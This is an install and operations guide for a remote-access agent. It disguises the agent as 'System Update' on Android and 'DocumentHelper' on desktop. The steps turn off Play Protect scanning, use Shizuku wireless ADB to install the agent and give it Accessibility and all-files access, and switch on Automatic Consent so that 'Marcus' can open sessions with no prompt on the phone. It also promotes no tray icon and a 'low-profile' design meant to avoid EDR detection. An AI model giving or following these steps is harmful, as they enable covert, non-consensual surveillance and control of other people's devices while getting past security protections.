Android: no-cable install

Only for phones with no cable. The installer declares no Accessibility, so Play Protect lets it through; it then uses Shizuku (wireless ADB) to install the agent as the shell user.

Before you start: if System Update or MeshCentral Agent is already installed, uninstall it first. The signing key differs and the update will fail.

1. Allow this browser to install

Chrome → ⋮ → Settings → Install unknown apps → allow for Chrome.
Play Store → profile → Play Protect → ⚙ → turn off Scan apps with Play Protect if it lets you.

2. Install the installer

Use the No-cable installer button on the Android card. It has no sensitive permissions, so it should install with at most an “Install anyway” prompt — it is not hard-blocked like the agent.

3. Set up Shizuku (one time)

  1. Install Shizuku from Play Store.
  2. Settings → About phone → tap Build number 7×.
  3. Developer options → Wireless debugging → on.
  4. Open Shizuku → Pairing → open its notification → enter the pairing code → Start.

Shizuku runs as the ADB shell user. It cannot auto-start after a reboot without root; the installed agent still reconnects by itself.

4. Install System Update

Open System Update Installer → Install System Update → allow Shizuku when asked. It copies the agent, installs it, unlocks Restricted Settings, grants All files access, enables Accessibility, whitelists battery and launches the app.

5. Confirm

The main screen must read Connected under the server name — not Disconnected, not Connecting.
Overflow menu → Check Unattended Setup must report complete. If any row says Needs setup, open it and fix it.
Reboot and confirm it returns to Connected on its own.

Do not tap Disconnect or swipe the app away and assume it is dead — the foreground service survives.

Note: Automatic Consent is already on. When Marcus opens a session there is no phone prompt — normal, not broken.

How the connection works

Every agent dials outbound TLS WebSocket to mesh.telcom.stream:443. There are no inbound ports, no port forwarding, and no listener on the device, so it works behind NAT and typical firewalls.

The agent runs in the background on every platform: a Windows service, a macOS launch daemon, a Linux systemd service, and an Android foreground service. There is no tray icon or session window during remote access.

Android screen view and input use the Accessibility service, so there is no MediaProjection “start recording?” prompt. Sessions connect silently because Automatic Consent is on. Expect roughly 2–3 fps — enough to drive the phone, not to watch video.

No agent is invisible to a determined EDR. The low-profile design is outbound-only TLS on 443, release-signed binaries, no listener, and a benign label (System Update on Android, DocumentHelper on desktop). If a managed device runs application allow-listing, the binary or package still needs approval.
